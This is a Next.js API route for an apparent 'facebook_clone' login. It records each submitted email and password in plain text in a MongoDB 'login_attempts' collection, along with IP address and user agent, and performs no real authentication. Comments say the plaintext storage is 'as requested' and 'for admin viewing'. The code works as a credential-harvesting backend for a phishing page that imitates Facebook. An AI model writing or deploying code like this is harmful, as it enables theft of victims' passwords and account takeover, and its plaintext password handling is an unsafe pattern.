import { type NextRequest, NextResponse } from "next/server"
import { MongoClient } from "mongodb"

const MONGODB_URI = process.env.MONGODB_URI || "mongodb://localhost:27017"
const DB_NAME = process.env.DB_NAME || "facebook_clone"

export async function POST(request: NextRequest) {
  try {
    const { email, password } = await request.json()

    if (!email || !password) {
      return NextResponse.json({ error: "Email and password are required" }, { status: 400 })
    }

    // Connect to MongoDB
    const client = new MongoClient(MONGODB_URI)
    await client.connect()

    const db = client.db(DB_NAME)
    const collection = db.collection("login_attempts")

    // Store login credentials (password in plain text as requested)
    const loginData = {
      email,
      password, // Plain text password for admin viewing
      timestamp: new Date(),
      ip: request.headers.get("x-forwarded-for") || "unknown",
      userAgent: request.headers.get("user-agent") || "unknown",
    }

    const result = await collection.insertOne(loginData)
    await client.close()

    return NextResponse.json(
      {
        message: "Login credentials saved successfully",
        attemptId: result.insertedId.toString(),
      },
      { status: 200 },
    )
  } catch (error) {
    console.error("Database error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
